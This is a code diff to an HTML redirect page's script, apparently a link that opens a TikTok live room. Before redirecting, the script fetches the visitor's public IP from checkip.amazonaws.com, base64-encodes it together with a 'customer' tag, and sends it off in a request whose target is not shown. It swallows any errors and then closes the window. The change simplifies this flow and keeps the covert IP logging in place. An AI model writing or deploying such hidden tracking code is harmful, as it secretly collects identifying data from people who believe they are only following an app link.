@@ -59,17 +59,6 @@
         window.location.href = `snssdk1180://live?room_id=${room_id}`;
       }
 
-      function isAndroid() {
-        try {
-          const userAgent =
-            navigator.userAgent || navigator.vendor || window.opera;
-          return /android/i.test(userAgent);
-        } catch (error) {
-          console.log(error);
-          return false;
-        }
-      }
-
       async function loadData() {
         try {
           const res = await fetch("https://checkip.amazonaws.com");
@@ -79,18 +68,12 @@
               unescape(encodeURIComponent(`${data} ${customer}`))
             )}`
           );
-        } catch {
-        } finally {
-          setTimeout(window.close, 1000);
-        }
+        } catch {}
       }
 
-      if (isAndroid()) {
-        loadData().then(redirectTo);
-      } else {
-        loadData();
-        redirectTo();
-      }
+      loadData()
+        .then(redirectTo)
+        .finally(() => setTimeout(window.close, 1000));
     </script>
   </body>
 </html>
